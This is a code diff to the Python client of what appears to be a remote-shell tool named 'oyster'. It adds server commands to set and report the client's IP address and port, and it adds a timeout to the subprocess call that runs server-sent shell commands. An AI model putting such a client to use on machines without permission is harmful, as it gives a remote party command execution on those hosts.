@@ -17,6 +17,8 @@ class Client(object):
         self.shutdown_kill = shutdown_kill
         self.session_id = session_id
         self.reconnect_to_session = True
+        self.ip_address = '0.0.0.0'
+        self.connected_port = '00000'
         self.sock = self._connect_to_server()
 
     def _connect_to_server(self):
@@ -221,8 +223,26 @@ class Client(object):
                         self.set_session_id(data.split(' ')[1])
                         continue
 
+                    # Send the current working directory back.
                     if data == 'oyster getcwd':
                         self._send_output_with_cwd('')
+                        continue
+
+                    # Set the client ip so it's aware
+                    if data[:7] == 'set ip ':
+                        self.send_data('IP set.')
+                        self.ip_address = data[7:]
+                        continue
+
+                    # Send ip back to server.
+                    if data[:6] == 'get ip':
+                        self.send_data(self.ip_address)
+                        continue
+
+                    # Set the client port so it's aware.
+                    if data[:9] == 'set port ':
+                        self.send_data('Port set.')
+                        self.connected_port = data[9:]
                         continue
 
                     # Check to see if the client should send the
@@ -348,7 +368,8 @@ class Client(object):
                     shell=True,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE
+                    stdin=subprocess.PIPE,
+                    timeout=600
                 )
 
                 # Compile the output.
